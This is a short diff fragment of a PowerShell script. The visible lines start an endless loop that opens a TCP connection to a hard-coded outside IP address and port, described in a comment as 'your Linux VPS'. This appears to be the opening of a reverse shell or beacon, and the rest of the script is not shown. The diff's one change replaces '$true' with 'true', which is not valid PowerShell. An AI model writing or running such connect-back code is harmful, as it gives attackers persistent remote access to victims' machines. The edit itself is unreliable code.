@@ -1,4 +1,4 @@
-while ($true) {
+while (true) {
     try {
         # Attempt to establish a TCP connection to your Linux VPS
         $client = New-Object System.Net.Sockets.TCPClient("62.72.26.25", 6000);
